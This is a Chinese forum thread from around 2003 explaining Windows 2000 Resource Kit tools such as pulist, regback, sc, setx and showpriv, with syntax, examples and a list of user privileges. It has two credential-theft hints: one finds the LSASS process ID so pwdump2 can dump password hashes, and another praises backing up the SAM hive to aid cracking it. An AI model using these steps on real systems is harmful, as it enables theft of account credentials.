DOS底下看到的东西太少，也不好看，还是GUI爽！而且还可以同时管理多台计算，不错吧！我是挺喜欢的，比 

Ctrl+Alt+Del出来的那个东西要好得多！） 

这个程序并没有和Reskit一起安装，而实在Reskit的目录下生成一个名为Ptree的目录，底下有个ptree.msi 

，要点击安装。同时由于这是一个基于COM+的程序，而安装ptreeCOM的时侯，需要MSDTC服务，注意不要把它 

关了，不然会导致ptree不能正常运行，而且只会提示不能找到服务，后来是查了错误日志才发现的，微软坑人 

！。我就因为这个弄了好一阵子，呵呵！ 

使用嘛，很简单，GUI就不用说了，都有提示，说一下命令行模式吧！ 

ptree -c computer -k│-kt process -?│/? 

-c computer 
当要管理的是远程主机的时侯才需要用的这个参数，如果是本机就不要啦，直接ptree就可以了。 

-k process 
干掉后面指定的进程。 
这里的process可以是进程的名字也可以是PID。 
-kt process 
可以干掉整整一棵树。 

举例： ptree -c hello 然后出来一大串东西，自己看吧！ 

16. pulist.exe 

命令行工具，和上面那个东西有点类似，和Tlist也有一点像（这东西在Support Tools里面）但是 

pulist.exe多一点点好处，可以显示出进程和用户之间的关系。比如： 

C:\>pulist 

Process PID User 
Idle 0 
System 8 
smss.exe 156 NT AUTHORITY\SYSTEM 
csrss.exe 176 NT AUTHORITY\SYSTEM 
winlogon.exe 172 NT AUTHORITY\SYSTEM 
services.exe 228 NT AUTHORITY\SYSTEM 
lsass.exe 240 NT AUTHORITY\SYSTEM 
svchost.exe 428 NT AUTHORITY\SYSTEM 
spoolsv.exe 452 NT AUTHORITY\SYSTEM 
msdtc.exe 480 NT AUTHORITY\SYSTEM 
tcpsvcs.exe 604 NT AUTHORITY\SYSTEM 
svchost.exe 620 NT AUTHORITY\SYSTEM 
llssrv.exe 644 NT AUTHORITY\SYSTEM 
nspmon.exe 712 USER1-COMPUTER1\NetShowServices 
nscm.exe 724 USER1-COMPUTER1\NetShowServices 

当你的计算机有多个处理器时，需要判断安全上下关系的时侯这个工具的用处就体现出来了！如果是远程操作的 

时候就多加一个pulist \\server就可以了。而且可以顺序显示多个站点pulist \\server \\server………， 

但是这个时侯会不显示User。 

当你需要专门查找一个已知的进程的时候，可以用这样的方法来简化查找： 
pulist │ find "string" 

比如，过去老的pwdump2需要知道LSASS的PID，我们可以这样做： 

c:\>pulist │ find "LSASS" 
LSASS.EXE 252 NT AUTHORITY\SYSTEM 
然后使用252来运行pwdump2……… 

17. Reducer.exe （Reduce Trace Data) 

这个东西是一个命令行的事件追踪工具，可以用来处理Tracelog（后面会提到这个工具）产生的记录，形成每 

个线程，每个进程的工作量记录。 

实际上呢，Reducer就是一个用来进一步分析工具，比如TraceDump（后面提到）可以允许你对一个追踪日志进 

行摘要，而Reducer则允许你进行拆分获得更多的细节，诸如： 

事务统计表：响应时间，每秒的事务数，每个事务的磁盘读写，每个事务的网络流量，CPU的使用（包括核心和 

用户空间）。 
映象统计表：事务有关的每个进程，每个进程相关的线程，每个进程的CPU使用（包括kernel和user)，每个进 

程的磁盘读写，每个进程的网络流量。 
磁盘信息：总的磁盘读写，每个进程的磁盘读写。 
OK，接下来介绍一下语法。 

语法非常简单： 

reducer -out filename -h│-help│-? 

-out filename 
输出的文件的名字，默认是Workload.txt 

举例：这里我已经事先使用Tracelog生成了一个logfile.etl，然后， 
reducer -out my_workload.txt c:\logfile.etl就行了。 

+------------------------------------------------------------------------------------- 

----------------------------------------------+ 
│ WINDOWS 2000 Capacity Planning Trace 

│ 
│ Version : 2128 

│ 
│ Type : Default 

│ 
+------------------------------------------------------------------------------------- 

----------------------------------------------+ 
│ 

│ 
│ Build : 2195 

│ 
│ Processors: 1 

│ 
│ Start Time: 17 Feb 2002 23:14:17.430 

│______________________________________________________________________│ │ 
│ End Time : 17 Feb 2002 23:14:38.550 

│ 
│ Duration : 21 Sec 

│ 
│ 

│ 
│ Trace Name: NT Kernel Logger 

│ 
│ File Name : C:\LogFile.Etl 

│ 
│ Start Time: 17 Feb 2002 23:14:17.430 

│______________________________________________________________________│ │ 
│ End Time : 17 Feb 2002 23:14:38.550 

│ 
│ Duration : 21 Sec 

│ 
│ 

│ 
+------------------------------------------------------------------------------------- 

----------------------------------------------+ 


+------------------------------------------------------------------------------------- 

----------------------------------------------+ 
│ Transaction Statistics 

│ 
+------------------------------------------------------------------------------------- 

----------------------------------------------+ 
│ Transaction Sort Trans Response Transaction Disk/Trans 

Tcp/Trans │ 
│ Key Time(ms) Rate/sec Reads 

Writes Sends Recieves │ 
+------------------------------------------------------------------------------------- 

----------------------------------------------+ 
+------------------------------------------------------------------------------------- 

----------------------------------------------+ 
～ 

样式大概会是这样的。 

18. Regback.exe （Registry Backup) 

一个注册表备份用工具，允许你在系统运行期间对注册表进行备份。我想当你需要测试一个软件时，最好先备份 

一下注册表。在使用这个程序时，至少需要备份文件和文件夹的权限。Regback.exe在运行的时侯需要调用 

Replacekey函数。 

语法： 

regback destination_dir filename hivetype hivename more│/? 

destination_dir 
备份文件的位置 

filename 
要创立的文件 

hivetype 
machine或者是users 

hivename 
HKLM或者HKLU 

这里提几点注意： 

Regback可以备份整个注册表hive（你可以理解为一个file，比如HKEY_USERS\Default在硬盘上实际上就是 

%SYSTEMROOT%\SYSTEM32\CONFIG\DEFAULT\DEFAULT.LOG）还包括了ACLs(Access control lists)，所 

以你也可以用这个东东发现和以前不同的ACLs。 

Regback不能自动备份Config文件夹以外的文件，你要手动进行，这是为了避免名字冲突。如果当前注册表并没 

有打开的hive需要自己用Xcopy.exe或者是Scopy.exe拷贝。另外，没有装入的Hive也要自己弄。 

如果出错的话，Regback会在第一次的时候就停止工作。它也不能覆盖存在的文件，会报错。还有如果空间不合 

适的话，备份就不能进行，所以最好先备份到硬盘上，然后再拷贝到磁盘上保存。 

举两个例子吧！ 

备份全部活动的Hives 

C:\>regback c:\backup 
saving SECURITY to c:\backup\SECURITY 
saving SOFTWARE to c:\backup\software 
saving SYSTEM to c:\backup\system 
saving .DEFAULT to c:\backup\default 
saving SAM to c:\backup\SAM 

***Hive = '\REGISTRY\USER'\'S-1-5-21-1177238915-1383384898-1957994488-500' 
Stored in file '\Device\HarddiskVolume1\Documents and Settings\Administrator'\'N 
TUSER.DAT' 
Must be backed up manually 
regback users S-1-5-21-1177238915-1383384898-1957994488-50 
0 


***Hive = '\REGISTRY\USER'\'S-1-5-21-1177238915-1383384898-1957994488-500_Classe 
s' 
Stored in file '\Device\HarddiskVolume1\Documents and Settings\Administrator\Loc 
al Settings\Application Data\Microsoft\Windows'\'UsrClass.dat' 
Must be backed up manually 
regback users S-1-5-21-1177238915-1383384898-1957994488-50 
0_Classes 

你看，连SAM都可以备份，对于破解SAM，也是有非常大的用处的。 

下面是备份指定的User的Profile 
C:\>regback c:\backup\administrator.bku users s-1-5-21-1177238915-1383384898-195 
7994488-500 
saving s-1-5-21-1177238915-1383384898-1957994488-500 to c:\backup\administrator. 
bku 

这里用的是SID比较特别，只是用起来太麻烦了，输那么多数字，呵呵！ 

最后是做一个网络备份，也是一个批量脚本。 
注意使用Schedule服务一起搭配。前面提到过regback不能覆盖文件，一旦有重名的文件将会导致错误的发生 

。 

echo on 
rem ... Name: doback.bat 
rem ... Purpose: Network backup for Registry files 
rem ... Process: Connect to backup share, delete old backup files, copy over new 

backup files 
rem ... Before using this batch file, create a share containing the following 

directories: backup, config. Set permissions on this share so that appropriate users 

can run this script. 

net use \\myshare\backup 

rem --> delete old backups; regback will not copy over an existing file 
echo y│del

虚拟空间 论坛空间 域名注册
木木是做虚拟主机的,有需要请PM联系我,可以拿到优惠价格
注意:非站务合作购买相关事宜,请不要加小木QQ,因无时间回答众热心网友的问题  
      奖励 惩罚    

木木 
查看公开信息 
发短消息给 木木 
发送邮件给 木木 
访问 木木 的个人网站 
查找 木木 发表的更多帖子 
添加 木木 到好友列表 
木木的奖品 
 高尔夫 
 超人 
游戏中心 
在Arcade向 木木 挑战! 

 2003-01-28, 14:08    #2  
木木   
网盟站长


 


注册日期: Oct 2002
您的住址: 浙江
帖子: 3,258 
精华: 20
现金: 47333 金币
资产: 78136 金币
声望: 141 
  Resource Kit 第一部分（24～43） 

--------------------------------------------------------------------------------

Resource Kit 第一部分（24～43） 


24. Sc.exe （Service Controller Tool） 

干好一年以前就写过这个东西介绍了。大家再看一遍吧！:s 

我们知道在MStools SDK，也就是在Resource Kit有一个很少有人知道的命令行软件，SC.exe，这个软件向所有的Windows NT和Windows 2000要求控制他们的API函数。我们可以在命令行里通过对这些函数设定参数的方式来设定他们(API)。SC.exe也可以显示服务的状态，同时也可以从状态结构区域里重新找到存储在里面的数值。它还可以列出远程计算机的服务函数或者是服务状况结构。SC.exe这个开发工具至少可以比服务控制面板程序和网络命令行界面(net.exe，这个东西可以告诉你一个服务是 
在运行中，还是停止，还是暂停。）这两个东西提供更多的细节和准确的信息。虽然上述两个东西在正常工作的情况下，对于完整的调试是非常好用的，但是如果有新的服务，或者新的代码被开发出来的时候，这两个工具提供的信息可能造成误导。这也就是我们需要用到SC的原因。 

下面举列说明，如果在开发阶段，你的服务在挂住在一个start-pending的时候，控制面板和net.exe同样报告服务是在运行的。但它挂在一个stop-pending的时候，net.exe报告它运行，而控制面板着报告它停止，如果你试着 启动它，这是控制面板则会告诉你这个服务正在运行。难道这不是很困惑吗？呵呵！ 
SC.exe可以让你询问服务的状况和取出存储在状态结构区域内的数值，控制面板和net.exe不提供服务完整的状况 。但是无论如何，SC程序可以告诉你这个服务准确的情形，同样也可以给你看最后的checkpoint数和等待提示。 
这个checkpoint，我叫它检查点(我觉得他就像一个程序调试时置的断点)，所以我们也可以把看作为一个调试工具，因为它可以提供一个关于在程序停止时还要沿着初始化继续前进多久准确报告。 
SC.exe也可以允许你调用很多的服务控制API函数，可以让你从命令行里改变大量的参数。这位服务开发者们提供了很多的优势。例如，它提供了一个方便的方式来创建或者在注册表和服务控制管理数据库中配置服务信息。开发者们不需要在手动的在注册表里单独的设置键值来配置服务，也不用重起机器来强迫服务控制管理数据库升级 。 
作为一个命令很工具，SC.exe可以用来测试你自己的系统，你可以设置一个批处理文件来使用不同的参数调用SC.exe来控制服务。这个很有用，如果你想看看你的服务不断的启动和停止，我没有试过哦！让一个服务一下子 
打开，一下子关闭，听上去很不错的。如果你的服务进程里面有多个进程的话，你可以保持一个进程继续运行不 
让它走开，然后让另一个不断的打开在关闭，还可以寻找一下内存缺乏导致不完全清楚的证据。 
下面介绍SC，SC QC，and SC QUERY 

SC使用这样的语法： 
1. SC [Servername] command Servicename [Optionname= Optionvalue] 

2. SC [command] 

这里使用第一种语法使用SC，使用第二种语法显示帮助。 

下面介绍各种参数。 

Servername 
可选择：可以使用双斜线，如\\myserver，也可以是\\192.168.0.1来操作远程计算机。如果在本地计算机上 

操作 
就不用添加任何参数。 

Command 
下面列出SC可以使用的命令。 

config 改变一个服务的配置。（长久的） 

continue 对一个服务送出一个继续控制的要求。 

control 对一个服务送出一个控制。 

create 创建一个服务。（增加到注册表中） 

delete 删除一个服务。（从注册表中删除） 

EnumDepend 列举服务的从属关系。 

GetDisplayName 获得一个服务的显示名称。 

GetKeyName 获得一个服务的服务键名。 

interrogate 对一个服务送出一个询问控制要求。 

pause 对一个服务送出一个暂停控制要求。 

qc 询问一个服务的配置。 

query 询问一个服务的状态，也可以列举服务的状态类型。 

start 启动一个服务。 

stop 对一个服务送出一个停止的要求。 

Servicename 
在注册表中为service key制定的名称。注意这个名称是不同于显示名称的（这个名称可以用net start和服务 

控 
制面板看到），而SC是使用服务键名来鉴别服务的。 

Optionname 
这个optionname和optionvalue参数允许你指定操作命令参数的名称和数值。注意，这一点很重要在操作名称 

和等 
号之间是没有空格的。一开始我不知道，结果………………，比如，start= optionvalue，这个很重要。 
optionvalue可以是0，1，或者是更多的操作参数名称和数值对。 
如果你想要看每个命令的可以用的optionvalue，你可以使用sc command这样的格式。这会为你提供详细的帮 

助。 

Optionvalue 
为optionname的参数的名称指定它的数值。有效数值范围常常限制于哪一个参数的optionname。如果要列表请 

用 
sc command来询问每个命令。 

Comments 
很多的命令需要管理员权限，所以我想说，在你操作这些东西的时候最好是管理员。呵呵！ 

当你键入SC而不带任何参数时，SC.exe会显示帮助信息和可用的命令。当你键入SC紧跟着命令名称时，你可以 

得 
到一个有关这个命令的详细列表。比如，键入sc create可以得到和create有关的列表。 
但是除了一个命令，sc query，这会导出该系统中当前正在运行的所有服务和驱动程序的状态。 

当你使用start命令时，你可以传递一些参数（arguments）给服务的主函数，但是不是给服务进程的主函数。 

SC create 
这个命令可以在注册表和服务控制管理数据库建立一个入口。 

语法1 
sc [servername] create Servicename [Optionname= Optionvalue] 

这里的servername，servicename，optionname，optionvalue和上面的一样，这里就不多说了。这里我们 

详细说 
明一下optionname和optionvalue。 

Optionname Optionvalue 
描述 

type= own, share, interact, kernel, filesys 
关于建立服务的类型，选项值包括驱动程序使用的类型，默认是share。 

start= boot, system, auto, demand, disabled 
关于启动服务的类型，选项值包括驱动程序使用的类型，默认是demand（手动）。 

error= normal, severe, critical, ignore 
当服务在导入失败错误的严重性，默认是normal。 

binPath= (string) 
服务二进制文件的路径名，这里没有默认值，这个字符串是必须设置的。 

group= (string) 
这个服务属于的组，这个组的列表保存在注册表中的ServiceGroupOrder下。默认是nothing。 

tag= (string) 
如果这个字符串被设置为yes，sc可以从CreateService call中得到一个tagId。然而，SC并不显示这个标签 

，所 
以使用这个没有多少意义。默认是nothing 

depend= (space separated string)有空格的字符串。 
在这个服务启动前必须启动的服务的名称或者是组。 

obj= (string) 
账号运行使用的名称，也可以说是登陆身份。默认是localsystem 

Displayname= (string) 
一个为在用户界面程序中鉴别各个服务使用的字符串。 

password= (string) 
一个密码，如果一个不同于localsystem的账号使用时需要使用这个。 

Optionvalue 
Optionname参数名称的数值列表。参考optionname。当我们输入一个字符串时，如果输入一个空的引用这意味 

着 
一个空的字符串将被导入。 

Comments 
The SC CREATE command performs the operations of the CreateService API function. 
这个sc create命令执行CreateService API函数的操作。详细请见CreateService。 

例1 
下面这个例子在一台叫做（\\myserver）的计算机上为一个叫“NewService”的服务建立的一个注册表登记。 
sc \\myserver create NewService binpath= c:\winnt\system32\NewServ.exe 

按照默认，这个服务会建立一个WIN32_SHARE_PROCESS使用SERVICE_DEMAND_START启动方式。这将不会有任 

何从属 
关系，也将会按照localsystem安全上下关系来运行。 

例2 
下面这个例子将在本地计算机上，建立一个服务，它将会是一个自动运行服务，并且运行在他自己的进程上。它 
从属于TDI组和NetBios服务上。注意，你必须在从属中间增加一个空格的引用。 

sc create NewService binpath= c:\winnt\system32\NewServ.exe type= own 
start= auto depend= "+TDI Netbios" 

例3 
服务开发者可以通过临时改变二进制路径（影像路径）的方式来将这个服务运行在内核调试器的上下关系中。下 
面这个例子就可以让我们看到如何改变服务的配置。 

sc config NewService binpath= "ntsd -d c:\winnt\system32\Newserv.exe" 
这个例子会引起服务控制管理器调用ntsd.exe使用下例的参数字符串： 
"-d c:\nt\system32\NewServ.exe" 

当系统装入newserv.exe时ntsd将会转而打断调试器，所以断点可以被设置在服务代码里。 

SC QC 
这个SC QC“询问配置”命令可以列出一个服务的配置信息和QUERY_SERVICE_CONFIG结构。 

语法1 
sc [Servername] qc Servicename [Buffersize] 

Parameters 
servername和servicename前面已经介绍过了，这里不再多说。 

Buffersize，可选择的，列出缓冲区的尺寸。 

Comments 

SC QC命令显示了QUERY_SERVICE_CONFIG结构的内容。 

以下是QUERY_SERVICE_CONFIG相应的区域。 
TYPE dwServiceType 
START_TYPE dwStartType 
ERROR_CONTROL dwErrorControl 
BINARY_PATH_NAME lpBinaryPathName 
LOAD_ORDER_GROUP lpLoadOrderGroup 
TAG dwTagId 
DISPLAY_NAME lpDisplayName 
DEPENDENCIES lpDependencies 
SERVICE_START_NAME lpServiceStartName 

例1 

下面这个例子询问了在上面例子中建立的“NewService”服务的配置： 

sc \\myserver qc NewService 

sc显示下面的信息： 

SERVICE_NAME: NewService 
TYPE : 20 WIN32_SHARE_PROCESS 
START_TYPE : 3 DEMAND_START 
ERROR_CONTROL : 1 NORMAL 
BINARY_PATH_NAME : c:\winnt\system32\NewServ.exe 
LOAD_ORDER_GROUP : 
TAG : 0 
DISPLAY_NAME : NewService 
DEPENDENCIES : 
SERVICE_START_NAME : LocalSystem 

NewService有能力和其他的服务共享一个进程。但是它不是自动启动的。二进制文件名是NewServ.exe。这个 

服务 
不依靠与其它的的服务，而且运行在lcoalsystem的安全上下关系中。这些都是调用QueryServiceStatus基 

本的返 
回，如果还需要更多的细节届时，可以看看API函数文件。 

SC QUERY 

SC QUERY命令可以获得服务的信息。 

语法： 
sc [Servername] query { Servicename │ Optionname= Optionvalue... } 

参数： 

servername, servicename, optionname, optionvalue不在解释。只谈一下这个命令提供的数值。 

Optionname Optionvalue 
Description 

type= driver, service, all 
列举服务的类型，默认是service 

state= active, inactive, all 
列举服务的状态，默认是active 

bufsize= (numeric value) 
列举缓冲区的尺寸，默认是1024 bytes 

ri= (numeric value) 
但开始列举时，恢复指针的数字，默认是0 

Optionvalue 
同上。 

Comments 

SC QUERY命令可以显示SERVICE_STATUS结构的内容。 

下面是SERVICE_STATUS结构相应的信息： 
TYPE dwServiceType 
STATE dwCurrentState, dwControlsAccepted 
WIN32_EXIT_CODE dwWin32ExitCode 
SERVICE_EXIT_CODE dwServiceSpecificExitCode 
CHECKPOINT dwCheckPoint 
WAIT_HINT dwWaitHint 

在启动计算机后，使用SC QUERY命令会告诉你是否，或者不是一个启动服务的尝试。如果这个服务成功启动， 

WIN32_EXIT_CODE区间会将会包含一个0，当尝试不成功时，当它意识到这个服务不能够启动时，这个区间也会 

提供一个退出码给服务。 

例子 

查询“NewService"服务状态，键入： 

sc query NewService 

显示一下信息： 

SERVICE_NAME: NewService 
TYPE : 20 WIN32_SHARE_PROCESS 
STATE : 1 STOPPED 
(NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN) 
WIN32_EXIT_CODE : 1077 (0x435) 
SERVICE_EXIT_CODE : 0 (0x0) 
CHECKPOINT : 0x0 
WAIT_HINT : 0x0 

注意，这里存在一个给这个服务的退出码，即使这个服务部不在运行，键入net helpmsg 1077，将会得到对 

1077错误信息的说明： 

上次启动之后，仍未尝试引导服务。 

所以，这里我想说一句，希望大家可以活用net helpmsg，这会对你的学习有很大的帮助。 

下面在对SC query的命令在说明一下： 

列举活动服务和驱动程序状态，使用以下命令： 
sc query 

显示messenger服务，使用以下命令： 
sc query messenger 

只列举活动的驱动程序，使用以下命令： 
sc query type= driver 

列举Win32服务，使用以下命令： 
sc query type= service 

列举所有的服务和驱动程序，使用以下命令： 
sc query state= all 

用50 byte的缓冲区来进行列举，使用以下命令： 
sc query bufsize= 50 

在恢复列举时使用index=14，使用以下命令： 
sc query ri=14 

列举所有的交互式服务，使用以下命令： 
sc query type= service type= interact 

好了，说到这里。SC命令基本上已经说完了。希望大家好好看看，呵呵！相信会有帮助的！！ 

25. Scanreg.exe 

又是个注册表工具，有没有人烦了？我都快烦了，呵呵！ 

一个注册表检查工具，基本上就是一个"registry GREP"。支持搜索本地或远程的Win一家老小的注册表中的任 

意东西。 

scanreg -s string -k -v -d -r key -c -e -n 

-s 
要搜索的字符串 

-r 
开始搜索的root，默认是HKEY_CURRENT_USER 

也可以使用以下的格式： 
HKEY_LOCAL_MACHINE === lm 
HKEY_CURRENT_USER === cu 
HKEY_CLASSES_ROOT === cr 
HKEY_USERS === us 

-k 
查询键。 

-v 注意必须指定-k -v -d中的至少一个。 
查询值。 

-d 
当然是查询数据。 

-c （默认是不敏感） 
大小写敏感。 

-e （默认是返回所有合适的） 
只返回却确合适的。 

-n 
输出的时候不使用颜色（默认是key红，values绿，data黄）真不知道微软的怎么想的！！看上去怪怪的，还有 

就是匹配的字符串都高亮标出。 

最后来两个例子： 

scanreg -s version -k -v -d 

scanreg -s version -kvd <--居然这种独可以？ 

scanreg /s version /r \lm\software /kvde 没有关系，这种都是可以的，呵呵！ 

scanreg version \\hello\HKEY_LOCAL_MACHINE -d 操作远程的东东。 


26. sclist.exe 

可以列出当前运行或者是停止的服务。看看远程的机器也是功能之一，但是比起SC来说，还是太简单了！ 

sclist -r -s MachineName -? 

-r 
只显示正在运行的服务。 

-s 
只显示已经停止的服务。 

Machinename 
本地可以不指出。 

这个简单大家自己做做，这里不举例了！！:) ，不要讲我偷懒哦！ 


27. Setx.exe 

这个命令行工具提供了一种批量修改环境变量的方法，同时不需要使用任何编程方法或者是脚本。此外，除了可 

以获得变量和值之外还可以跟注册表的值挂上关系。在2000中除了setx.exe之外，其他没有任何一种命令行工 

具可以直接设置系统变量值。只有通过控制面板和注册表编辑器才能够设置。如果有人说可以用set命令的话， 

实际上这个CMD的内部命令只能够设置当前控制台窗口的用户环境变量。 

setx允许你通过Command Line Mode，Registry Mode，File Mode，这三种模式来设置环境变量。 

a. Command-Line 

setx variable value -m 

variable 
要设置的环境变量的名字。 

value 
要设置的值。 

-m 
设置计算机环境，默认设置是用户环境。 

b. Registry Mode 

setx variable -k hive\key\……\value -m 

variable 
要设置的环境变量的名字。 

-k 
指定变量设置会基于注册表中的信息。 

hive\key\……\value 
注册表路径，如： 
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\StandardName 

-m 
同命令行模式。 

c. File Mode 

setx variable -f filename -a x,y │ -r x,y "string" -d d -x -m 

-f filename 
指定使用的文件名。 

-a x,y 
指定要搜索的绝对坐标或者是偏移量。 

-r x,y "string" 
指定从"string"的相对坐标或者是偏移。 

-d d 
指定附加的分隔符，后一个d表示，可以是",", "\"等等。系统有四个内建的分隔符是：space, tab, 

carriage return, linefeed。附加的可以是任意的ASCII字符。 

-x 
显示文件坐标，这个时候-a, -r, -d会变忽略。 

-m 
在同上。 

setx将变量写入到在注册表的主环境中去。用setx设置的变量将会在下一次启动的时候生效，这是2000的局限 

。当访问REG_MULTI_SZ时，只能访问到第一个项目。 

目前setx只可以支持HKCU和HKLM两个hives。用Setx增加的值不可以用setx去掉，可以在控制面板里面改，也 

可以在注册表里面改，这种时候也可以用set把它置空。 

但是还是来几个例子吧！ 

a.Command Line 

Setx MACHINE COMPAQ 
在用户环境中设置MICHINE为COMPAQ。 

setx MYPATH %PATH% 
设置MYPATH的值为当前PATH变量的值。 

setx MYPATH ~PATH~ 
设置MYPATH总是和PATH环境的值保持一致。 

b. Registry 

Setx TZONE -k 

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\TimeZoneInformation\StandardName 
设置TZONE的值为上面的键。比如："Central Standard Time" 

Setx BUILD -k "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows 

NT\CurrentVersion\CurrentBuildNumber" 
设置BUILD的值为当前的Windows NT版本号，如：1314。 

c. File 
在进行这部分之前先运行ipconfig > ipconfig.out，弄一个ipconfig的文本出来。然后就可以进行操作了 

。 

Setx var -f ipconfig.out -x 
这个命令会显示这个文件的内容的坐标。如： 

C:\>SETX VAR -f ipconfig.out -x 


(1,0 Windows) (1,1 2000) (1,2 IP) (1,3 Configuration) 

(3,0 Ethernet) (3,1 adapter) (3,2 Local) (3,3 Area) (3,4 Connection:) 

(5,0 Connection-specific) (5,1 DNS) (5,2 Suffix) (5,3 .) (5,4 :) 
(6,0 IP) (6,1 Address.) (6,2 .) (6,3 .) (6,4 .) (6,5 .) (6,6 .) (6,7 .) (6,8 .) 
(6,9 .) (6,10 .) (6,11 .) (6,12 .) (6,13 :) (6,14 192.168.1.1) 
(7,0 Subnet) (7,1 Mask) (7,2 .) (7,3 .) (7,4 .) (7,5 .) (7,6 .) (7,7 .) (7,8 .) 
(7,9 .) (7,10 .) (7,11 .) (7,12 .) (7,13 :) (7,14 255.255.255.0) 
(8,0 Default) (8,1 Gateway) (8,2 .) (8,3 .) (8,4 .) (8,5 .) (8,6 .) (8,7 .) (8,8 
.) (8,9 .) (8,10 .) (8,11 :) 

setx ipaddr -f ipconfig.out -a 5,11 

这个命令会寻找绝对偏移为(5，11)的内容，然后设置ipaddr为这个值。如： 

C:\>setx ipaddr -f ipconfig.out -a 6,14 
Extracted value is: 192.168.1.1 

Setx ipgateway -f ipconfig.out -r 0,11 "Gateway" 
查找Gateway这个字符串偏移0，11的东东，然后写到ipgateway里面去。 

C:\>Setx ipgateway -f ipconfig.out -r 0,11 "Gateway" 
Extracted value is: 192.168.1.244 

以上所有的修改都会在重起以后看到，可以用set或者是控制面板中的System properties看。 

28. showpriv.exe （show Privilege） 

一个用来显示用户或者是组分配的特权的命令行工具，如果要看domain的相关的东西的话，要在DC上使用。 


使用起来很简单，showpriv privilege就行了，如： 

C:\>showpriv sesecurityprivilege 
1 account(s) with the sesecurityprivilege user right: 
BUILTIN\Administrators 
All accounts enumerated 

这里主要讲一下这个2000的一些privilege。 

Privilege，为本地管理员提供了一种手段，可以控制允许什么人具有什么权限或者能执行什么样的系统操作， 

如允许交互式登陆等等。这里我们说的特权是指特殊操作所需的权限，如备份呀什么的！一旦授予了某种特权， 

这些特权就会包括在用户的安全访问令牌中。这是一些基本的概念，可以看以下，比较容易明白。 

系统为了管理的方便总是为每个本地组分配了相应的特权，而且从来不改变这个特权，这些东东在NT系统上可以 

分为内置能力，标准用户权力，高级用户权力这么几种，但是在2000中标准权利和高级权力已经被用户特权所取 

代，只有在为委派而信任计算机和用户帐户（SeEnableDelegationPrivilege)和把计算机从dock中移出（ 

SeUndockPrivilege)这两种情况下可以把NT的权利映射到2000中的特权。 
注意一下2000的一些问题。并非所有能力都有匹配的权利，因此，不可能用权力完全匹配组的内置能力。而由于 

特定组能力的预定义分配和不能把所有能力复制为权力，就难以区分任务，并且只能强制使用最低特权的概念。 

那么在域一级下就缺少一个安全结构，导致了难以授予管理的功能。2000在AD引入后，就允许区分任务，也可授 

予domain和OU相应的管理层次。 

下面来谈一下具体的一些用户特权，应当有26个，也有说28个的。 

SeTcbPrivilege 
成为OS的一部分 
允许进程可以像用户一样被鉴别，因此可以像用户一样访问相应的资源。只有底层的鉴别服务需要这样的特权， 

所以无论是工作站，独立服务器，还是DC都没有把这个设为某人权利。 

SeMachineAccountPrivilege 
添加工作站到域 
为了这个特权可以启用，必须保证这个用户在域控制器本地安全策略中的才行。 

SeBackupPrivilege 
备份文件和目录。 
允许用户绕过文件和目录的权限来做备份。只有当应用程序尝试访问NTFS备份API时才检查这个特权。默认情况 

下，这个特权分配给Administrators和Backup Operators。 

SeChangeNotifyPrivilege 
回避遍历检查。 
允许用户来回移动目录，但是不能列出文件夹的内容。默认情况下，这种特权被赋予Administrators, 

Backup Operators, Power Users, Users ,and Everyone，换句话说就是所有人都有这种权利。 

SeSystemTimePrivilege 
改变系统时间。 
默认情况下Administrators和Power Users有这种权利。 

SeCreatePagefilePrivilege 
创建分页文件。 
允许用户创建和改变一个分页文件的大小。默认情况下，只有Administrators有这个特权。 

SeCreateTokenPrivilege 
创建令牌对象。 
允许进程调用NtCreateToken()或者是其他的Token-Creating APIs创建一个访问令牌。 

SeCreatePermanentPrivilege 
创建永久共享对象。 
允许进程在2000项目管理器中创建一个目录对象。 

SeDebugPrivilege 
调试程序。 
允许用户连接一个Debugger来调试任何进程。默认情况下Administrators有该特权。 

SeEnableDelegationPrivilege 
为委派而信任计算机和用户帐户。 
允许用户为了委派而改变信任，只有当用户或者是计算机对该对象的帐户控制标志有写权限的时候可以。 

SeRemoteShutdownPrivilege 
远程关闭系统。 
Administrators在默认情况下有此特权。 

SeAuditPrivilege 
产生安全审核。 
允许一个应用程序在安全日志中，创建，产生，增加一条记录。 

SeIncreaseQuotaPrivilege 
增加限额。 
允许一个有写属性的进程利用其他进程从而取得更多的处理器限额，这种特权有利于系统调试，但是也有导致 

DOS的可能。 

SeIncreaseBaseProrityPrivilege 
增加调度优先级。 
允许一个有写属性的进程利用其它进程来获得更多的执行优先权。有这种特权的用户可以在Task管理器中改变一 

个进程的调度优先权。默认情况Administrators有该特权。 

SeLoadDriverPrivilege 
安装和卸载设备驱动程序。 
允许用户安装和卸载即插即用设备的驱动程序，不是即插即用的不受这个特权影响，但是只能被 

Administrators所安装。因为驱动程序是作为被信任的程序来运行的，这需要很高的特权。而这种特权可能会 

被用于安装恶意程序，和破坏性的访问。默认情况下Administrators有该特权。 

SeSecurityPrivilege 
管理审计和安全日志。 
允许用户指定对象访问的审计。有这种特权的用户也可以清空安全日志。默认情况下Administrators有该特权 

。 

SeSystemEnvironmentPrivilege 
修改firmware环境变量。 
允许用户使用进程通过一个API来设置系统环境变量，另外，也可以让用户使用System Properties来做到以上 

这一步。默认情况下Administrators有该特权。 

SeProfileSingleProcessPrivilege 
Profile单一进程。 
允许用户使用性能监视器来监视nonsystem进程。默认情况下Administrators有此特权。 


SeSystemProfilePrivilege 
Profile系统性能。 
允许用户使用性能监视器来监视system进程。默认情况下Administrators有此特权。 

SeUndockPrivilege 
将计算机中dock中删除。 
允许用户使用Eject PC从坞中将计算机移出，默认情况下Administrators, Power Users, Users均有此特 

权。 

SeAssignPrimaryTokenPrivilege 
替换一个进程级令牌。 
允许一个父进程替换相关的子进程的访问令牌。 

SeRestorePrivilege 
恢复文件和目录。 
允许用户绕过文件及目录权限来恢复备份文件。默认情况下Administrators和Backup Operators有此特权。 

SeShutdownPrivilege 
关闭系统。 
允许用户关闭本地计算机。默认情况下Administrators, Backup Operators, Power Users, Users都有 

该特权，但是在2000 Server中Users没有此特权。 

SeSynchAgentPrivilege 
同步目录服务数据。 
允许一个进程提供目录同步服务，这个特权只有在DC上。默认情况下域的Administrators和LocalSystem帐户 

有此特权。 

SeTakeOwnershipPrivilege 
取得文件所有者身份。 
允许用户取得在系统中任何可得到的对象的所有者身份，包括：AD对象，文件，文件夹，打印机，注册表键，进 

程和线程。默认情况下Administrator有此特权。 

